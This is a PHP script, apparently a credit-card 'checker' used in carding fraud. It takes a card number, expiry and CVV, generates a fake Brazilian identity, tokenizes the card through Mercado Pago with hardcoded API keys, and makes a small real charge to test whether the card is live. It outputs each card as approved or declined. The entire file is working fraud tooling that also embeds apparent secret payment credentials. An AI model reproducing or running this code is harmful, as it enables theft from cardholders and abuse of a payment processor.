<?php
error_reporting(0);
 

$cartao = $_GET['cc'];
$mes = $_GET['mes'];
$ano = $_GET['ano'];
$cvv = $_GET['cvv'];



require_once 'lib/mercadopago.php';






function multiexplode($delimiters, $string) {

    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return $launch;
}

$x1 = "APP_USR-6971bea6-854f-41a4-8a89-486addf325bd";
$x2 = "APP_USR-7777410540406962-021523-e203083c450d6793c8919cbafe20dab1-404744430";





function mod($dividendo, $divisor) {
    return round($dividendo - (floor($dividendo / $divisor) * $divisor));
}

function __curl2($url = false, $post = false, $headers = false) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    if ($post) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }
    if ($headers) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    }
    $exec = curl_exec($ch);
    return $exec;
}

$devs = __curl2("https://www.4devs.com.br/ferramentas_online.php", "acao=gerar_pessoa&sexo=H&idade=" . mt_rand(20, 70) . "&pontuacao=N&cep_estado=&cep_cidade=");
$obj = json_decode($devs, true);
extract($obj);

function __curl($opcoes) {
    $ch = curl_init();
    curl_setopt_array($ch, $opcoes);
    
    $exec = curl_exec($ch);
    return $exec;
}

$opt2 = array(
    CURLOPT_URL => "https://api.mercadopago.com/v1/card_tokens?public_key=$x1&js_version=1.6.15&referer=https://www.mercadopago.com.br/",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_HTTPHEADER => array("Accept: application/json", "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36", "Content-Type: application/json", "Connection: keep-alive", "Host: api.mercadopago.com"),
    CURLOPT_POST => 1,
    CURLOPT_POSTFIELDS => "{}"
);
$d2 = __curl($opt2);
$json = json_decode($d2, true);
//print_r($json);
extract($json);
/* */
$opt4 = array(
    CURLOPT_URL => "https://api.mercadopago.com/v1/card_tokens/$id?public_key=$x1&js_version=1.6.15&referer=https://www.mercadopago.com.br/",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_HTTPHEADER => array("Accept: application/json", "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36", "Content-Type: application/json", "Origin: https://www.mercadopago.com.br/", "Connection: keep-alive", "Host: api.mercadopago.com"),
    CURLOPT_CUSTOMREQUEST => "PUT",
    CURLOPT_POSTFIELDS => '{"device":{"meli":{"session_id":"' . md5(mt_rand()) . '"}},"card_number":"'.$cartao.'","security_code":"'.$cvv.'","expiration_month":'.$mes.',"expiration_year":'.$ano.' ,"cardholder":{"name":"' . $nome . '","identification":{"type":"CPF","number":"' . $cpf . '"}}}'
);
$d4 = __curl($opt4);
$obj = json_decode($d4, true);
extract($obj);
/* */






$tentativas = 0;

$valorCobrar = mt_rand(6, 15);

while (true) {
    $tentativas++;
    $devs = __curl2("https://www.4devs.com.br/ferramentas_online.php", "acao=gerar_pessoa&sexo=H&idade=" . mt_rand(20, 70) . "&pontuacao=N&cep_estado=&cep_cidade=");
    $obj = json_decode($devs, true);
    extract($obj);

    $sla = explode(" ", $obj['nome']);
    $firstName = $sla[0];
    unset($sla[0]);
    $segundoNome = implode(" ", $sla);




    $authorize = __curl2("https://api.mercadopago.com/v1/payments?access_token=$x2", json_encode(array(
        "transaction_amount" => $valorCobrar,
        "token" => $id,
        "installments" => 1,
        "description" => "Serviço (22) - " . mt_rand(),
        "payment_method_id" => $cctype,
        "payer" => array(
            "email" => "$email",
            "identification" => array(
                "number" => $cpf,
                "type" => "CPF"
            ),
            "first_name" => $firstName,
            "last_name" => $segundoNome
        ),
        "capture" => true,
        "additional_info" => array(
            "payer" => array(
                "first_name" => $firstName,
                "last_name" => $segundoNome,
                "address" => array(
                    "zip_code" => $cep,
                    "street_name" => $endereco,
                    "street_number" => $numero
                )
            )
        )
    )), array("content-type: application/json", "accept: application/json"));

    $payment = json_decode($authorize, true);



    if (!isset($payment['message'])) {
        break;
    }
    if ($tentativas >= 3) {
        echo json_encode(array("status" => 2, "str" => "$cartao;$mes;$ano;$cvv;" . "empty_return" . PHP_EOL));
        die();
        break;
    }
}



switch ($payment['status_detail']) {
    case "pending_review_manual":
    echo json_encode(array("status" => 1, "str" => "$cartao;$mes;$ano;$cvv;" . implode(";", $bin) . PHP_EOL, "debitado" => "R$" . $valorCobrar));
    break;
    case "accredited":
    echo json_encode(array("status" => 1, "str" => "$cartao;$mes;$ano;$cvv;" . implode(";", $bin) . PHP_EOL, "debitado" => "R$" . $valorCobrar));
    break;
    default:
    echo json_encode(array("status" => 3, "str" => "$cartao;$mes;$ano;$cvv;" . $payment["status_detail"] . PHP_EOL));
    break;
}